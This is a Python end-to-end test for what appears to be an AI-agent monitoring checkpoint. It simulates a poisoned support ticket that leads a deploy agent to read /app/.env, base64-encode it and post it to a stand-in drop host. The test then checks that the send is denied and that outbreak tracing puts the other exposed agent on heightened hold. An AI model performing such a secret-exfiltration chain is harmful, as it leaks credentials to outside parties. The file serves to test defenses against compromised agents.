"""Act 3 end-to-end against the real (local) ClickHouse: trace → heightened → next risky send held.

    uv run pytest -m e2e tests/e2e/test_outbreak_e2e.py -q

The support agent reads the poisoned ticket first; the deploy agent then runs the secret-theft
prefix and its send is held and denied (incident). Sripadha's detection.outbreak.run_outbreak finds the
other reader of that ticket with a real ClickHouse query and posts the outbreak; the checkpoint puts the
support agent on heightened watch, and its next external send is held even with global hold OFF.
Rows use unique ``e2e-*`` ids (synthetic=0) and are deleted at module teardown.
"""

from __future__ import annotations

import uuid

import httpx
import pytest

from checkpoint.app import create_app
from checkpoint.service import FIXTURES_DIR
from checkpoint.writer import ClickHouseWriter
from tests.unit.conftest import ch_up, make_settings
from tripwire.ch import client as ch_client
from tripwire.contracts import QuickCheckInput, Verdict

pytestmark = [pytest.mark.e2e, pytest.mark.skipif(not ch_up(), reason="ClickHouse not reachable at localhost:8123")]

RUN = uuid.uuid4().hex[:6]
TICKET = f"ticket:e2e{RUN}"
DROP = f"https://drop-{RUN}.example.net/upload"


def agent(name: str) -> str:
    return f"e2e-{name}-{RUN}"


@pytest.fixture(scope="module", autouse=True)
def cleanup():
    yield
    ch_client().command(
        "ALTER TABLE events DELETE WHERE synthetic = 0 AND startsWith(agent_id, 'e2e-') SETTINGS mutations_sync = 2"
    )


class Judge:
    """Stands in for AkashML: malicious when the checkpoint says the agent is exposed or the prefix matched."""

    def __init__(self) -> None:
        self.inputs: list[QuickCheckInput] = []

    async def __call__(self, inp: QuickCheckInput) -> Verdict:
        self.inputs.append(inp)
        bad = "heightened" in inp.context or "funnel prefix" in inp.context
        return Verdict(
            verdict="malicious" if bad else "benign",
            confidence=0.95 if bad else 0.9,
            reason="test judge",
            decision_source="rule_only",
        )


async def test_outbreak_trace_then_exposed_agent_is_held(tmp_path, monkeypatch):
    outbreak = pytest.importorskip("detection.outbreak")
    judge = Judge()
    writer = ClickHouseWriter(table="events")
    app = create_app(
        writer=writer,
        settings=make_settings(),
        state_path=tmp_path / "state.json",
        ch_enabled=True,
        fixtures_dir=FIXTURES_DIR,
        web_dist=None,
        classify=judge,
    )
    support, deploy = agent("support"), agent("deploy")
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t", timeout=60) as c:
        tool = lambda a, action, target, **kw: c.post("/tool", json={"agent_id": a, "action": action, "target": target, **kw})  # noqa: E731

        # patient zero: both agents read the poisoned ticket; the deploy agent then attacks (hold ON)
        assert (await tool(support, "read_file", TICKET)).json()["result"] == "ok"
        await c.post("/config/hold", json={"enabled": True})
        assert (await tool(deploy, "read_file", TICKET)).json()["result"] == "ok"
        assert (await tool(deploy, "read_file", "/app/.env", tainted_by=TICKET)).json()["result"] == "ok"
        assert (await tool(deploy, "run_command", "base64 /app/.env", tainted_by=TICKET)).json()["result"] == "ok"
        sent = (await tool(deploy, "http_post", DROP, payload="x", tainted_by=TICKET)).json()
        assert sent["result"] == "denied" and sent["incident_id"]
        await c.post("/config/hold", json={"enabled": False})

        # flush the batch writer (ASGITransport skips the app lifespan), then trace with a REAL query
        assert await writer.flush_once()
        ob = await outbreak.run_outbreak(sent["incident_id"], client=c, timeout_s=30)
        assert ob is not None and ob.source_id == TICKET, ob

        inc = (await c.get(f"/incidents/{sent['incident_id']}")).json()
        assert inc["outbreak"]["source_id"] == TICKET
        assert support in inc["outbreak"]["exposed_agents"] and deploy not in inc["outbreak"]["exposed_agents"]
        assert f"drop-{RUN}.example.net" in inc["outbreak"]["blocked_destinations"]
        status = (await c.get("/status")).json()
        assert status["modes"].get(support) == "heightened" and status["hold_enabled"] is False

        # its next risky send is held before it runs, although global hold is OFF
        n = len(judge.inputs)
        nxt = (await tool(support, "http_post", f"https://partner-{RUN}.example.org/v1", payload="y", tainted_by=TICKET)).json()
        assert nxt["result"] == "denied" and nxt["reason"].startswith("hold")
        assert len(judge.inputs) == n + 1 and "heightened" in judge.inputs[-1].context

    await writer.stop()
